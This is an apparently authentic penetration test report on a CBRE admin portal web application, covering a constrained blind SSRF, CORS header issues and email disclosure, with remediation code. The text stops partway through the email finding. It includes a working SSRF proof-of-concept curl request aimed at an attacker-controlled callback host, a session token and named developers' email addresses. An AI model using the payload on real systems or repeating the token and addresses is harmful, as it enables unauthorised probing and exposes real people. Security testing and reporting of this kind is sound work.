<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CBRE Digiverse Admin Portal - Penetration Test Report</title>
    <style>
        @page {
            margin: 2cm;
            size: A4;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333;
            background: #fff;
            orphans: 3;
            widows: 3;
        }
        
        .cover-page {
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%);
            color: white;
            page-break-after: always;
            text-align: center;
            padding: 40px;
        }
        
        .cover-page h1 {
            font-size: 48px;
            margin-bottom: 20px;
            font-weight: 700;
        }
        
        .cover-page h2 {
            font-size: 32px;
            margin-bottom: 40px;
            font-weight: 300;
        }
        
        .cover-info {
            background: rgba(255,255,255,0.1);
            padding: 30px;
            border-radius: 10px;
            margin-top: 40px;
            backdrop-filter: blur(10px);
        }
        
        .cover-info p {
            font-size: 18px;
            margin: 10px 0;
        }
        
        .content {
            max-width: 1000px;
            margin: 0 auto;
            padding: 40px;
        }
        
        h1 {
            color: #1e3a8a;
            font-size: 32px;
            margin: 40px 0 20px 0;
            padding-bottom: 10px;
            border-bottom: 3px solid #3b82f6;
            page-break-after: avoid;
            page-break-inside: avoid;
        }
        
        h2 {
            color: #1e40af;
            font-size: 24px;
            margin: 30px 0 15px 0;
            page-break-after: avoid;
            page-break-inside: avoid;
        }
        
        h3 {
            color: #2563eb;
            font-size: 20px;
            margin: 25px 0 12px 0;
            page-break-after: avoid;
            page-break-inside: avoid;
        }
        
        h4 {
            color: #3b82f6;
            font-size: 18px;
            margin: 20px 0 10px 0;
            page-break-after: avoid;
            page-break-inside: avoid;
        }
        
        p {
            margin: 12px 0;
            text-align: justify;
            orphans: 2;
            widows: 2;
        }
        
        .executive-summary {
            background: #f0f9ff;
            border-left: 5px solid #3b82f6;
            padding: 25px;
            margin: 30px 0;
            border-radius: 5px;
            page-break-inside: avoid;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 25px 0;
            font-size: 14px;
            page-break-inside: avoid;
            table-layout: fixed;
        }
        
        table thead {
            background: #1e3a8a;
            color: white;
        }
        
        table th {
            padding: 15px;
            text-align: left;
            font-weight: 600;
            word-wrap: break-word;
        }
        
        table td {
            padding: 12px 15px;
            border-bottom: 1px solid #e5e7eb;
            word-wrap: break-word;
            word-break: break-word;
            overflow-wrap: break-word;
        }
        
        table tr:nth-child(even) {
            background: #f9fafb;
        }
        
        .severity-critical {
            background: #7f1d1d;
            color: white;
            padding: 4px 12px;
            border-radius: 4px;
            font-weight: 600;
            display: inline-block;
        }
        
        .severity-high {
            background: #dc2626;
            color: white;
            padding: 4px 12px;
            border-radius: 4px;
            font-weight: 600;
            display: inline-block;
        }
        
        .severity-medium {
            background: #f59e0b;
            color: white;
            padding: 4px 12px;
            border-radius: 4px;
            font-weight: 600;
            display: inline-block;
        }
        
        .severity-low {
            background: #10b981;
            color: white;
            padding: 4px 12px;
            border-radius: 4px;
            font-weight: 600;
            display: inline-block;
        }
        
        .severity-info {
            background: #6b7280;
            color: white;
            padding: 4px 12px;
            border-radius: 4px;
            font-weight: 600;
            display: inline-block;
        }
        
        .finding-box {
            background: #fff;
            border: 2px solid #e5e7eb;
            border-radius: 8px;
            padding: 25px;
            margin: 30px 0;
            page-break-inside: avoid;
        }
        
        .finding-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 2px solid #e5e7eb;
        }
        
        .finding-title {
            font-size: 22px;
            color: #1e3a8a;
            font-weight: 600;
        }
        
        .cvss-badge {
            background: #1e3a8a;
            color: white;
            padding: 8px 15px;
            border-radius: 5px;
            font-weight: 600;
            font-size: 14px;
        }
        
        .code-block {
            background: #1f2937;
            color: #f9fafb;
            padding: 20px;
            border-radius: 5px;
            overflow-x: auto;
            margin: 15px 0;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            line-height: 1.5;
            page-break-inside: avoid;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        
        .code-inline {
            background: #f3f4f6;
            color: #dc2626;
            padding: 2px 6px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
        }
        
        .info-box {
            background: #eff6ff;
            border-left: 4px solid #3b82f6;
            padding: 20px;
            margin: 20px 0;
            border-radius: 4px;
            page-break-inside: avoid;
        }
        
        .warning-box {
            background: #fef3c7;
            border-left: 4px solid #f59e0b;
            padding: 20px;
            margin: 20px 0;
            border-radius: 4px;
            page-break-inside: avoid;
        }
        
        .success-box {
            background: #d1fae5;
            border-left: 4px solid #10b981;
            padding: 20px;
            margin: 20px 0;
            border-radius: 4px;
            page-break-inside: avoid;
        }
        
        .danger-box {
            background: #fee2e2;
            border-left: 4px solid #dc2626;
            padding: 20px;
            margin: 20px 0;
            border-radius: 4px;
            page-break-inside: avoid;
        }
        
        ul, ol {
            margin: 15px 0 15px 30px;
            page-break-inside: avoid;
        }
        
        li {
            margin: 8px 0;
        }
        
        .toc {
            background: #f9fafb;
            padding: 30px;
            border-radius: 8px;
            margin: 30px 0;
        }
        
        .toc h2 {
            color: #1e3a8a;
            margin-top: 0;
        }
        
        .toc ul {
            list-style: none;
            margin-left: 0;
        }
        
        .toc li {
            padding: 8px 0;
            border-bottom: 1px dotted #d1d5db;
        }
        
        .toc a {
            color: #2563eb;
            text-decoration: none;
        }
        
        .toc a:hover {
            text-decoration: underline;
        }
        
        .page-break {
            page-break-after: always;
        }
        
        .checkmark {
            color: #10b981;
            font-weight: bold;
        }
        
        .crossmark {
            color: #dc2626;
            font-weight: bold;
        }
        
        .footer {
            margin-top: 60px;
            padding-top: 20px;
            border-top: 2px solid #e5e7eb;
            text-align: center;
            color: #6b7280;
            font-size: 12px;
        }
        
        @media print {
            .page-break {
                page-break-after: always;
            }
            
            .finding-box {
                page-break-inside: avoid;
            }
            
            body {
                print-color-adjust: exact;
                -webkit-print-color-adjust: exact;
            }
            
            /* Keep headings with following content */
            h1, h2, h3, h4 {
                page-break-after: avoid;
                page-break-inside: avoid;
            }
            
            h3 + p, h3 + ul, h3 + ol, h3 + .code-block,
            h4 + p, h4 + ul, h4 + ol, h4 + table {
                page-break-before: avoid;
            }
            
            /* Prevent breaking within content blocks */
            .info-box, .warning-box, .success-box, .danger-box,
            .executive-summary, .finding-box, .code-block {
                page-break-inside: avoid;
            }
            
            /* Keep tables together */
            table {
                page-break-inside: avoid;
            }
            
            /* Keep lists together */
            ul, ol {
                page-break-inside: avoid;
            }
            
            /* Methodology sections */
            .finding-box h3 + p,
            .finding-box h3 + ul,
            .finding-box h3 + ol,
            .finding-box h3 + .code-block {
                page-break-before: avoid;
            }
        }
        
        /* Section grouping class for extra protection */
        .section-group {
            page-break-inside: avoid;
        }
    </style>
</head>
<body>
    <!-- Cover Page -->
    <div class="cover-page">
        <h1>PENETRATION TEST REPORT</h1>
        <h2>CBRE Digiverse Admin Portal</h2>
        <div class="cover-info">
            <p><strong>Client:</strong> CBRE / 3Point3 Automation Labs</p>
            <p><strong>Target:</strong> https://admintest.cbredigiverse.com</p>
            <p><strong>Test Date:</strong> October 11-13, 2025</p>
            <p><strong>Test Type:</strong> Black Box & Grey Box Testing</p>
            <p><strong>Application:</strong> Web Application</p>
        </div>
        <div style="margin-top: 60px;">
            <p style="font-size: 16px; opacity: 0.9;">Prepared by: Hareesh Rajendran</p>
            <p style="font-size: 14px; opacity: 0.8;">Independent Penetration Tester</p>
            <p style="font-size: 14px; opacity: 0.8;">Trivandrum, Kerala, India</p>
        </div>
    </div>

    <!-- Main Content -->
    <div class="content">
        <!-- Document Control -->
        <h2>Document Control</h2>
        <table>
            <thead>
                <tr>
                    <th>Field</th>
                    <th>Details</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td><strong>Target Application</strong></td>
                    <td>CBRE Digiverse Admin Portal</td>
                </tr>
                <tr>
                    <td><strong>URL</strong></td>
                    <td>https://admintest.cbredigiverse.com</td>
                </tr>
                <tr>
                    <td><strong>Pentester</strong></td>
                    <td>Hareesh Rajendran</td>
                </tr>
                <tr>
                    <td><strong>Location</strong></td>
                    <td>Trivandrum, Kerala, India</td>
                </tr>
                <tr>
                    <td><strong>Test Date</strong></td>
                    <td>October 11-13, 2025</td>
                </tr>
                <tr>
                    <td><strong>Report Date</strong></td>
                    <td>October 13, 2025</td>
                </tr>
                <tr>
                    <td><strong>Test Type</strong></td>
                    <td>Black Box & Grey Box Testing</td>
                </tr>
            </tbody>
        </table>

        <!-- Executive Summary -->
        <h1>Executive Summary</h1>
        
        <div class="executive-summary">
            <p>A comprehensive security assessment was conducted on the CBRE Digiverse Admin Portal (admintest.cbredigiverse.com) between October 11-13, 2025. The assessment identified <strong>one medium-severity constrained SSRF vulnerability</strong> with significant limitations preventing straightforward exploitation, along with several low-severity and informational findings.</p>
            
            <p style="margin-top: 15px;"><strong>Key Finding:</strong> The application's CORS implementation is <strong>secure and properly configured</strong> with an explicit whitelist of trusted origins. The only CORS-related issue is a missing Vary: Origin header, which is a low-severity configuration issue that may cause cache inconsistencies but does not represent a security vulnerability.</p>
        </div>

        <h2>Risk Summary</h2>
        <table>
            <thead>
                <tr>
                    <th>Severity</th>
                    <th>Count</th>
                    <th>Status</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td><span class="severity-critical">Critical</span></td>
                    <td>0</td>
                    <td>-</td>
                </tr>
                <tr>
                    <td><span class="severity-high">High</span></td>
                    <td>0</td>
                    <td>-</td>
                </tr>
                <tr>
                    <td><span class="severity-medium">Medium</span></td>
                    <td>1</td>
                    <td>Open</td>
                </tr>
                <tr>
                    <td><span class="severity-low">Low</span></td>
                    <td>1</td>
                    <td>Open</td>
                </tr>
                <tr>
                    <td><span class="severity-info">Informational</span></td>
                    <td>5</td>
                    <td>Open</td>
                </tr>
            </tbody>
        </table>

        <h2>Key Findings</h2>
        <ol>
            <li><strong>Blind Server-Side Request Forgery (SSRF) with Severe Constraints</strong> - Medium severity vulnerability limited to 3 fixed endpoint paths with blind responses and parameter injection protections</li>
            <li><strong>Missing Vary Header in CORS Responses</strong> - Low severity configuration issue that may cause cache inconsistencies</li>
            <li><strong>Redundant Proxy Infrastructure</strong> - Double proxy configuration breaking Vercel's security controls</li>
            <li><strong>Email Address Disclosure</strong> - Internal developer email addresses exposed</li>
            <li><strong>DOM-Based Data Manipulation</strong> - URL parameters passed unsanitized to browser APIs</li>
            <li><strong>Cacheable HTTPS Response with Sensitive Data</strong> - Improper cache headers on sensitive endpoints</li>
            <li><strong>Missing Security Headers</strong> - Inconsistent security header implementation</li>
        </ol>

        <div class="page-break"></div>

        <!-- Scope -->
        <h1>Scope of Assessment</h1>

        <h2>In Scope</h2>
        <ul>
            <li>Web application at https://admintest.cbredigiverse.com</li>
            <li>All publicly accessible endpoints</li>
            <li>Authenticated functionality (credentials provided)</li>
            <li>Infrastructure reconnaissance</li>
            <li>Technology stack analysis</li>
        </ul>

        <h2>Out of Scope</h2>
        <ul>
            <li>API endpoint testing (tested separately)</li>
            <li>Rate limiting mechanisms (deferred)</li>
            <li>Social engineering attacks</li>
            <li>Physical security</li>
            <li>Denial of Service (DoS) testing</li>
            <li>Third-party integrations</li>
        </ul>

        <h2>Limitations</h2>
        <ul>
            <li>Testing was conducted on a test environment</li>
            <li>Some authenticated features may not have been accessible</li>
            <li>API-specific testing was conducted separately and not included in this report</li>
        </ul>

        <div class="page-break"></div>

        <!-- Methodology -->
        <h1>Methodology</h1>

        <p>The assessment followed industry-standard penetration testing methodologies:</p>

        <h2>1. Information Gathering</h2>
        <ul>
            <li>DNS reconnaissance</li>
            <li>Technology stack identification</li>
            <li>Infrastructure analysis</li>
        </ul>

        <h2>2. Vulnerability Assessment</h2>
        <ul>
            <li>Automated scanning (Burp Suite, Nikto)</li>
            <li>Manual testing of identified vulnerabilities</li>
            <li>Authentication bypass attempts</li>
            <li>Input validation testing</li>
        </ul>

        <h2>3. Exploitation & Verification</h2>
        <ul>
            <li>Proof of concept development</li>
            <li>Impact analysis</li>
            <li>Evidence collection</li>
        </ul>

        <h2>4. Reporting</h2>
        <ul>
            <li>Risk assessment</li>
            <li>Remediation recommendations</li>
        </ul>

        <div class="page-break"></div>

        <!-- Technical Findings -->
        <h1>Technical Findings</h1>

        <!-- Finding 1: SSRF -->
        <div class="finding-box">
            <div class="finding-header">
                <div class="finding-title">1. Blind Server-Side Request Forgery (SSRF) with Severe Constraints</div>
                <div>
                    <span class="severity-medium">Medium</span>
                    <span class="cvss-badge">CVSS: 5.3</span>
                </div>
            </div>

            <p><strong>CVSS Vector:</strong> <span class="code-inline">CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L</span></p>

            <h3>Description</h3>
            <p>The application is vulnerable to blind Server-Side Request Forgery (SSRF) attacks in authenticated endpoints. However, <strong>critical constraints severely limit exploitation potential</strong>:</p>

            <div class="success-box">
                <ul>
                    <li><span class="checkmark">✅</span> <strong>Fixed endpoint paths:</strong> Server constructs only 3 specific endpoints regardless of input</li>
                    <li><span class="checkmark">✅</span> <strong>No parameter injection:</strong> All query parameters are properly URL-encoded</li>
                    <li><span class="checkmark">✅</span> <strong>Blind vulnerability:</strong> Responses invisible unless target returns exact JSON format</li>
                    <li><span class="checkmark">✅</span> <strong>Own credentials only:</strong> Only attacker's token sent (no credential theft)</li>
                    <li><span class="checkmark">✅</span> <strong>No data leakage:</strong> No server-side secrets in constructed URLs</li>
                </ul>
            </div>

            <h3>Affected Endpoints</h3>
            <table>
                <thead>
                    <tr>
                        <th>App Endpoint</th>
                        <th>Server Constructs</th>
                        <th>Parameters</th>
                        <th>Match Probability</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>/authorized/admintasks</td>
                        <td>/api/admin-tasks?pageNo=0&pageSize=&email=&lt;user&gt;...</td>
                        <td>Complex</td>
                        <td>⭐ Very Low</td>
                    </tr>
                    <tr>
                        <td>/authorized/users</td>
                        <td>/api/users</td>
                        <td>Clean path</td>
                        <td>⭐⭐⭐ Low-Moderate</td>
                    </tr>
                    <tr>
                        <td>/authorized/usefullinks</td>
                        <td>/api/useful-links</td>
                        <td>Clean path</td>
                        <td>⭐⭐ Low</td>
                    </tr>
                </tbody>
            </table>

            <p><strong>Note:</strong> /api/users is a common REST pattern, giving slightly higher exploitation potential than others, but still requires exact endpoint match on internal services.</p>

            <h3>Technical Details</h3>
            <p>The application accepts JSON parameters that are used to construct server-side HTTP requests. While the vulnerability was confirmed through DNS and HTTP interactions, extensive testing revealed that exploitation is significantly constrained.</p>

            <p><strong>Attack Vector:</strong></p>
            <div class="code-block">POST /authorized/users HTTP/2
Host: admintest.cbredigiverse.com
Content-Type: text/plain;charset=UTF-8
Cookie: authToken=&lt;valid_token&gt;

[{"token":"&lt;valid_token&gt;","email":"user@domain.com"...},"http://attacker.oastify.com"]</div>

            <h3>Evidence Captured</h3>
            <ol>
                <li><strong>DNS Interaction</strong> - DNS lookups confirmed for all 3 endpoints from source IP: 35.156.67.171 (Vercel)</li>
                <li><strong>HTTP Interaction</strong> - The server made HTTP requests to attacker-controlled domains:</li>
            </ol>

            <div class="code-block">GET /api/users HTTP/1.1
Host: attacker.oastify.com
Authorization: Bearer &lt;attacker's-own-token&gt;
User-Agent: node</div>

            <ol start="3">
                <li><strong>Injection Attempts Tested</strong> - All failed due to proper URL encoding:
                    <ul>
                        <li>CRLF injection (%0D%0A)</li>
                        <li>Parameter pollution (%26)</li>
                        <li>Path traversal (%2F)</li>
                        <li>Header injection attempts</li>
                    </ul>
                </li>
            </ol>

            <h3>Constraints Analysis</h3>
            
            <div class="success-box">
                <h4>What Was Confirmed:</h4>
                <ul>
                    <li><span class="checkmark">✅</span> Backend makes outbound HTTP requests to attacker-controlled domains</li>
                    <li><span class="checkmark">✅</span> Source IP disclosed: 35.156.67.171 (Vercel shared infrastructure)</li>
                    <li><span class="checkmark">✅</span> Can probe internal network for 3 specific endpoint paths only</li>
                    <li><span class="checkmark">✅</span> Responses visible only if target returns JSON in exact expected format</li>
                    <li><span class="checkmark">✅</span> Minor DoS potential via repeated requests (mitigated by auth + rate limiting)</li>
                </ul>
            </div>

            <div class="warning-box">
                <h4>Key Limitations:</h4>
                <ul>
                    <li><span class="crossmark">⚠️</span> <strong>Limited to 3 fixed paths</strong> - Cannot probe arbitrary endpoints or ports</li>
                    <li><span class="crossmark">⚠️</span> <strong>Parameter injection blocked</strong> - All tested bypasses failed (CRLF, header injection, parameter pollution)</li>
                    <li><span class="crossmark">⚠️</span> <strong>No server secrets in URLs</strong> - Only attacker-controlled data appears in requests</li>
                    <li><span class="crossmark">⚠️</span> <strong>Blind nature</strong> - Responses not visible without JSON format match</li>
                    <li><span class="crossmark">⚠️</span> <strong>Cloud metadata endpoints don't match</strong> required paths (/api/users, /api/admin-tasks, /api/useful-links)</li>
                </ul>
            </div>

            <h3>Impact Assessment</h3>
            
            <p><strong>Real-World Exploitation Scenarios:</strong></p>
            <p>Most Likely (via /api/users):</p>
            <ul>
                <li>Internal service with /api/users endpoint (common REST pattern)</li>
                <li>Service either returns JSON like {"users": [...]} OR doesn't validate Authorization token</li>
                <li>Contains sensitive data OR performs privileged operations</li>
                <li>Exploitable with attacker's own credentials or via chaining</li>
            </ul>

            <p><strong>Likelihood:</strong> Low-Moderate for /api/users; Very Low for other endpoints</p>

            <div class="info-box">
                <h4>Potential Impacts:</h4>
                <ul>
                    <li><strong>Limited Internal Network Access:</strong> Can probe for presence of 3 specific endpoints only</li>
                    <li><strong>Information Disclosure:</strong> Source IP exposure (35.156.67.171)</li>
                    <li><strong>Restricted Port Scanning:</strong> Only if services happen to use the exact required paths</li>
                    <li><strong>Minor DoS:</strong> Repeated requests could stress internal services (mitigated by authentication)</li>
                </ul>
            </div>

            <div class="danger-box">
                <h4>Why This is NOT Critical:</h4>
                <ul>
                    <li><strong>Critical SSRF allows:</strong> Any endpoint access, parameter injection, visible responses, data exfiltration</li>
                    <li><strong>This case has:</strong> 3 fixed paths only, no injection confirmed, blind unless JSON match, no data leakage observed</li>
                </ul>
            </div>

            <h3>Proof of Concept</h3>
            <div class="code-block"># Test all 3 endpoints
curl -X POST https://admintest.cbredigiverse.com/authorized/users \
  -H "Cookie: authToken=&lt;token&gt;" \
  -H "Content-Type: text/plain;charset=UTF-8" \
  -d '[{"token":"&lt;token&gt;","email":"test@domain.com"},"http://test.oastify.com"]'

# Result: GET /api/users request to test.oastify.com with attacker's token</div>

            <h3>Remediation Recommendations</h3>
            
            <p><strong>Priority:</strong> Medium</p>

            <h4>Immediate Actions (Apply to all 3 endpoints):</h4>

            <p><strong>1. URL Whitelist + IP Blocking</strong></p>
            <div class="code-block">const ALLOWED_DOMAINS = ['api.cbredigiverse.com', 'backend.cbredigiverse.com'];

function isAllowedURL(url) {
    const urlObj = new URL(url);
    // Block private IPs and metadata
    if (isPrivateIP(urlObj.hostname) ||
        urlObj.hostname === '169.254.169.254' ||
        urlObj.hostname === 'metadata.google.internal') return false;
    
    // Whitelist check
    return ALLOWED_DOMAINS.some(d => 
        urlObj.hostname === d || urlObj.hostname.endsWith('.' + d));
}</div>

            <p><strong>2. Rate Limiting (Aggregate across all SSRF endpoints)</strong></p>
            <div class="code-block">const rateLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100, // per user across all 3 endpoints
    keyGenerator: (req) => req.user.id
});</div>

            <p><strong>3. Logging & Alerting</strong></p>
            <div class="code-block">// Log all external requests with endpoint context
logger.info({
    appEndpoint: req.path,
    targetURL,
    targetEndpoint,
    userId: req.user.id,
    hasParameters: targetEndpoint.includes('?')
});

// Alert on >50 requests/15min from single user</div>

            <h4>Long-term Solutions:</h4>
            <ol>
                <li>Remove SSRF from /api/users first (highest risk due to common pattern)</li>
                <li>Disable redirects: maxRedirects: 0 in HTTP client</li>
                <li>Network segmentation: Restrict backend egress to known services</li>
                <li>Regular audits: Monitor for new URL-accepting endpoints</li>
            </ol>
        </div>

        <div class="page-break"></div>

        <!-- Finding 2: Missing Vary Header -->
        <div class="finding-box">
            <div class="finding-header">
                <div class="finding-title">2. Missing Vary Header in CORS Responses</div>
                <div>
                    <span class="severity-low">Low</span>
                    <span class="cvss-badge">CVSS: 3.7</span>
                </div>
            </div>

            <p><strong>CVSS Vector:</strong> <span class="code-inline">CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N</span></p>

            <h3>Description</h3>
            <p>The application implements a <strong>secure CORS policy</strong> with an explicit whitelist of trusted origins. Testing confirmed that only two specific subdomains are accepted, and all other origins are properly rejected. However, the Vary: Origin header is missing from CORS responses, which may lead to cache-related issues in intermediate proxies and CDNs.</p>

            <h3>Affected Resources</h3>
            <p><strong>API Endpoints (Authenticated):</strong></p>
            <ul>
                <li>/authorized/admintasks</li>
                <li>/authorized/usefullinks</li>
                <li>/authorized/users</li>
            </ul>

            <h3>Technical Details</h3>
            
            <div class="success-box">
                <h4>Current CORS Configuration (Secure):</h4>
                <p>The application correctly implements an explicit whitelist:</p>
                <div class="code-block">Whitelisted Origins:
- https://admin.cbredigiverse.com
- https://admintest.cbredigiverse.com

All other origins: Rejected with HTTP 403 Forbidden</div>
            </div>

            <p><strong>Response Headers (Current):</strong></p>
            <div class="code-block">Access-Control-Allow-Origin: https://admintest.cbredigiverse.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST, PUT, PATCH, DELETE, OPTIONS
Access-Control-Allow-Headers: Content-Type, Authorization

Missing Header:
Vary: Origin ← NOT PRESENT</div>

            <h3>Verification Tests</h3>

            <p><strong>✅ Test 1: Whitelisted Origin (Correctly Allowed)</strong></p>
            <div class="code-block">curl -I -H "Origin: https://admin.cbredigiverse.com" \
  https://admintest.cbredigiverse.com/authorized/users

HTTP/2 200 OK
Access-Control-Allow-Origin: https://admin.cbredigiverse.com
Access-Control-Allow-Credentials: true</div>

            <p><strong>✅ Test 2: Non-whitelisted Subdomain (Correctly Rejected)</strong></p>
            <div class="code-block">curl -I -H "Origin: https://www.cbredigiverse.com" \
  https://admintest.cbredigiverse.com/authorized/users

HTTP/2 403 Forbidden
(No CORS headers present)</div>

            <p><strong>✅ Test 3: Arbitrary Subdomain (Correctly Rejected)</strong></p>
            <div class="code-block">curl -I -H "Origin: https://test.cbredigiverse.com" \
  https://admintest.cbredigiverse.com/authorized/users

HTTP/2 403 Forbidden
(No CORS headers present)</div>

            <p><strong>✅ Test 4: External Domain (Correctly Rejected)</strong></p>
            <div class="code-block">curl -I -H "Origin: https://evil.com" \
  https://admintest.cbredigiverse.com/authorized/users

HTTP/2 403 Forbidden
(No CORS headers present)</div>

            <div class="success-box">
                <p><strong>Result:</strong> CORS whitelist is functioning correctly and securely.</p>
            </div>

            <h3>Impact</h3>

            <p><strong>Cache Poisoning Scenario (Low Probability):</strong></p>
            <p>Without the Vary: Origin header, intermediate caches (CDN, reverse proxies) may cache a response with a specific CORS origin and serve it to requests with different origins:</p>

            <p><strong>Step-by-step:</strong></p>
            <ol>
                <li>User A requests from https://admin.cbredigiverse.com</li>
                <li>Server responds with Access-Control-Allow-Origin: https://admin.cbredigiverse.com</li>
                <li>CDN caches this response (without considering the Origin header)</li>
                <li>User B requests the same endpoint from https://admintest.cbredigiverse.com</li>
                <li>CDN serves the cached response with wrong origin header</li>
                <li>Browser blocks the response due to CORS mismatch</li>
            </ol>

            <div class="warning-box">
                <h4>Actual Impact:</h4>
                <ul>
                    <li><span class="crossmark">❌</span> <strong>NOT a security breach</strong> (no data leakage)</li>
                    <li><span class="crossmark">❌</span> <strong>NOT exploitable</strong> for authentication bypass</li>
                    <li><span class="checkmark">✅</span> <strong>Potential denial of service</strong> (legitimate users get CORS errors)</li>
                    <li><span class="checkmark">✅</span> <strong>Inconsistent user experience</strong> across environments</li>
                </ul>
            </div>

            <div class="info-box">
                <h4>Risk Level Justification (Low):</h4>
                <ul>
                    <li>Limited to 2 whitelisted origins (both controlled by your organization)</li>
                    <li>Requires specific CDN caching behavior</li>
                    <li>Results in availability issue, not confidentiality/integrity breach</li>
                    <li>No credential leakage possible</li>
                    <li>No cross-origin data access possible</li>
                </ul>
            </div>

            <h3>Remediation Recommendations</h3>
            
            <p><strong>Priority:</strong> Low</p>

            <p>Add the Vary: Origin header to all CORS responses:</p>

            <div class="code-block">// Recommended Implementation
const ALLOWED_ORIGINS = [
    'https://admin.cbredigiverse.com',
    'https://admintest.cbredigiverse.com'
];

function setCORSHeaders(req, res) {
    const origin = req.headers.origin;
    if (ALLOWED_ORIGINS.includes(origin)) {
        res.setHeader('Access-Control-Allow-Origin', origin);
        res.setHeader('Access-Control-Allow-Credentials', 'true');
        res.setHeader('Vary', 'Origin'); // ← ADD THIS LINE
        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, PATCH, DELETE, OPTIONS');
        res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    }
}</div>

            <p><strong>For Next.js API Routes:</strong></p>
            <div class="code-block">// In middleware or API route
export default function handler(req, res) {
    const origin = req.headers.origin;
    if (ALLOWED_ORIGINS.includes(origin)) {
        res.setHeader('Access-Control-Allow-Origin', origin);
        res.setHeader('Access-Control-Allow-Credentials', 'true');
        res.setHeader('Vary', 'Origin'); // ← ADD THIS
        // ... rest of headers
    }
    // ... rest of handler
}</div>

            <h3>Testing Post-Remediation</h3>
            <div class="code-block"># Verify Fix:
curl -I -H "Origin: https://admin.cbredigiverse.com" \
  https://admintest.cbredigiverse.com/authorized/users | grep -i vary

# Expected output:
Vary: Origin</div>

            <h3>References</h3>
            <ul>
                <li>MDN Web Docs: Vary Header</li>
                <li>MDN Web Docs: CORS</li>
                <li>OWASP: CORS Security Cheat Sheet</li>
                <li>CWE-346: Origin Validation Error</li>
            </ul>
        </div>

        <div class="page-break"></div>

        <!-- Finding 3: Static Assets CORS -->
        <div class="finding-box">
            <div class="finding-header">
                <div class="finding-title">3. Static Assets with Wildcard CORS</div>
                <div><span class="severity-info">Informational</span></div>
            </div>

            <h3>Description</h3>
            <p>Static JavaScript files served from /_next/static/* return <span class="code-inline">Access-Control-Allow-Origin: *</span> headers. This is <strong>standard practice</strong> for CDN-served public assets and does <strong>not</strong> constitute a security vulnerability.</p>

            <h3>Affected Resources</h3>
            <ul>
                <li>/_next/static/chunks/app/authorized/usefullinks/page-e65ef1b2e2f720e9.js</li>
                <li>/_next/static/chunks/app/authorized/users/page-b0ef769f01ebcc6b.js</li>
                <li>/_next/static/chunks/polyfills-78c92fac7aa8fdd8.js</li>
                <li>All other files under /_next/static/*</li>
            </ul>

            <h3>Technical Details</h3>
            <div class="code-block">Access-Control-Allow-Origin: *
Content-Type: application/javascript
Cache-Control: public, max-age=31536000, immutable</div>

            <h3>Why This is NOT a Vulnerability</h3>

            <div class="success-box">
                <ol>
                    <li><strong>Public Content:</strong>
                        <ul>
                            <li>These files are publicly accessible to anyone</li>
                            <li>No authentication required to download</li>
                            <li>Anyone can access via direct URL in browser</li>
                            <li>Content is identical for all users</li>
                        </ul>
                    </li>
                    <li><strong>No Credentials:</strong>
                        <ul>
                            <li>Access-Control-Allow-Credentials header is <strong>absent</strong></li>
                            <li>Cookies/session data cannot be sent with requests</li>
                            <li>No authenticated data retrieval possible</li>
                        </ul>
                    </li>
                    <li><strong>Immutable Static Assets:</strong>
                        <ul>
                            <li>Content-addressed filenames (hash-based)</li>
                            <li>Files never change once deployed</li>
                            <li>Long cache times (1 year)</li>
                            <li>Standard Next.js/Vercel CDN behavior</li>
                        </ul>
                    </li>
                    <li><strong>No Sensitive Data:</strong>
                        <ul>
                            <li>Client-side JavaScript bundles</li>
                            <li>Framework/library code</li>
                            <li>Application routing logic</li>
                            <li>No hardcoded secrets, API keys, or tokens present</li>
                        </ul>
                    </li>
                    <li><strong>Industry Standard:</strong>
                        <ul>
                            <li>Recommended by Next.js documentation</li>
                            <li>Standard Vercel/Netlify/CloudFlare configuration</li>
                            <li>Used by major applications (GitHub, Netflix, etc.)</li>
                        </ul>
                    </li>
                </ol>
            </div>

            <h3>Recommendation</h3>
            <div class="success-box">
                <p><strong>No action required.</strong> This is correct and secure configuration for static assets.</p>
            </div>

            <h3>References</h3>
            <ul>
                <li>Next.js: Static File Serving</li>
                <li>MDN: CORS for Static Assets</li>
                <li>Vercel: CDN and Caching</li>
            </ul>
        </div>

        <div class="page-break"></div>

        <!-- Finding 4: Email Disclosure -->
        <div class="finding-box">
            <div class="finding-header">
                <div class="finding-title">4. Email Address Disclosure</div>
                <div><span class="severity-info">Informational</span></div>
            </div>

            <p><strong>CVSS Vector:</strong> <span class="code-inline">CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N</span> (3.7 - Low)</p>

            <h3>Description</h3>
            <p>Internal developer and administrative email addresses are exposed through API responses, potentially facilitating targeted phishing attacks or information gathering.</p>

            <h3>Affected Endpoint</h3>
            <ul>
                <li>/authorized/users</li>
            </ul>

            <h3>Disclosed Email Addresses</h3>
            <div class="code-block">dev.user@3point3labs.com
dev.admin@3point3labs.com
amit@3point3labs.com
mayank@3point3labs.com</div>

            <h3>Technical Details</h3>
            <p>The user listing endpoint returns full user objects including email addresses without proper filtering:</p>

            <div class="code-block">POST /authorized/users HTTP/2
Cookie: authToken=224211a6-aa42-47d2-a78b-beb0d8981b03

HTTP/2 200 OK
{
    "userList":[
        {
            "id":16,
            "email":"amit@3point3labs.com",
            "role":"COUNTRY_ADMIN",
            ...
        },
        {
            "id":61,
